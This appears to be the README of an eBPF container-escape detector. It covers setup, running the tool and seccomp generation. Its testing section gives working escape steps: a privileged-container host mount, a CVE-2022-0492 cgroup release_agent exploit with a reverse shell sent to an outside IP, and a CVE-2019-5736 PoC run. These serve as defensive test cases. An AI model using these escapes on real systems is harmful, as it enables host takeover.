# eBPF detector

## 环境依赖
1. 编译程序需要clang/llvm 版本>10，安装教程：https://apt.llvm.org/  
2. 本项目集成了docker镜像扫描工具trivy进行容器镜像的预扫描，若想使用该功能则需要安装trivy

```shell
# 使用apt源安装
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy

# 使用deb包安装
wget https://github.com/aquasecurity/trivy/releases/download/v0.30.4/trivy_0.30.4_Linux-64bit.deb
sudo dpkg -i trivy_0.30.4_Linux-64bit.deb
```

## 编译运行
1. 在主文件夹目录下初始化submodule
```shell
git submodule update --init --recursive
```
2. 在src目录下编译
```shell
make all
```
3. 运行单个组件
```shell
sudo ./syscount
```
4. 运行主程序
```shell
# 在监控模式下启动容器，并进行预扫描
# -a表示检测到异常后执行的响应：
## alert表示无响应，仅记录到日志中；
## intercept表示中断逃逸进程
# run参数表示通过main.py启动容器，-c后参数为启动容器的命令
# -s表示对容器镜像进行预扫描
sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --rm --name=test alpine /bin/sh" -s alpine

```
或者
```shell
# monitor表示只启动检测系统，-p后的参数为需要监控的容器的进程号
sudo python3 main.py -a alert monitor -p 1234
```
5. 容器方式
```shell
sudo docker run --rm -it --pid=host --cgroupns=host -v /home/ubuntu/Documents/container_escape_detection/src/main.py:/main.py -v /sys/kernel/:/sys/kernel/ -v /sys/fs/bpf/:/sys/fs/bpf/ -v /var/run/docker.sock:/var/run/docker.sock -v /home/ubuntu/Documents/container_escape_detection/src/log/:/container_monitor/log/ --privileged monitor:v3 /main.py -a intercept run -c "sudo docker run -itd --rm --name=test3 ubuntu /bin/bash"
```
## 说明
### 1. 
由于seccomp文件只能在容器启动时进行设置，暂时考虑容器的两种情况：

（1）容器已经启动 （2）容器使用main.py启动

- 对于（1），执行syscall调用监控、file操作监控、process操作监控，可以生成seccomp文件但不能应用

- 对于（2），需要预启动容器，模拟容器正常任务流，执行syscall调用监控（这个监控应该是整个容器生命周期的，包括启动、执行、停止，可以使用其它工具，比如sysdig），利用收集的syscall生成seccomp文件，然后启动容器，并添加参数“--security-opt seccomp=seccomp.json”。随后，执行file操作监控、process操作监控、syscall调用监控

**注意**：使用seccomp要安装一下包

```shell
sudo apt install libseccomp-dev libseccomp2 seccomp
```

### 2.
只做监控或许不够，也要有“响应”。参考[bouheki](https://github.com/mrtc0/bouheki/tree/master/pkg/bpf/c)这个，可以对file、mount设置黑名单，但是这个功能需要高版本内核（Linux Kernel >= 5.8.0），可以用ubuntu20.10测试


## 检测漏洞
### 1. 特权容器
> 该逃逸不限docker和Linux内核版本\
> 参考：https://github.com/Metarget/metarget/blob/master/writeups_cnv/config-privileged-container

使用main.py创建一个带特权的容器：
```shell
sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --rm --name privileged_container --privileged ubuntu /bin/bash"
```

进入当前正在运行的容器，并实施逃逸攻击：
```shell
# 进入容器
sudo docker exec -it privileged_container /bin/bash
# or
sudo docker attach privileged_container

# 容器内
mkdir host
mount /dev/sda1 /host   #/dev/sda1根据本机实际情况修改，可用fdisk工具查看
chroot /host
```

### 2. CVE-2022-0492
> 测试版本：Linux kernel-5.8.0；docker-18.03.1\
> 参考：https://github.com/Metarget/metarget/blob/master/writeups_cnv/kernel-cve-2022-0492

使用main.py创建一个禁用了AppArmor和Seccomp的容器：
```shell
sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --name=cve4092 --security-opt apparmor=unconfined --security-opt seccomp=unconfined --name=cve0492 --rm ubuntu /bin/bash"

```

在接收反弹shell的主机上监听4444端口：
```shell
ncat -lvnp 4444
```

进入当前正在运行的容器，并实施逃逸攻击：
```shell
# 进入容器
sudo docker exec -it cve0492 /bin/bash
# or
sudo docker attach cve0492

# 容器内
unshare -UrmC bash    # 这一步可以获取SYS_ADMIN权限
mount -it cgroup -o rdma cgroup /mnt
d=`dirname $(ls -x /mnt/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
printf '#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.233.139/4444 0>&1' > /exp.sh; chmod 777 /exp.sh  # 此处IP地址为接收反弹shell的IP地址
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$t/exp.sh" > $d/release_agent
sh -c "echo 0 >$d/w/cgroup.procs"

```

### 3. CVE-2019-5736
> 测试版本：Linux kernel-5.8.0；docker-18.03.1\
> 参考：https://github.com/Frichetten/CVE-2019-5736-PoC

使用main.py启动一个容器：
```shell
sudo python3 main.py -a alert/intercept run -c "sudo docker run -itd --name=cve5736 --rm ubuntu bash"
```

在接收反弹shell的主机上监听1234端口：
```shell
ncat -lvnp 1234
```

将漏洞利用程序拷贝进容器内，并进入容器：
```shell
# 拷贝漏洞利用程序进入容器内
# 漏洞利用代码在vuls/cve-2019-5736/main.go，需修改payload中接收反弹shell的IP地址，编译后使用
sudo docker cp main cve5736:/

# 进入容器
sudo docker exec -it cve5736 /bin/bash
# or
sudo docker attach cve5736

# 容器内
chmod +x main
./main
```

另执行sh命令触发漏洞：
```shell
sudo docker exec cve5736 sh
```
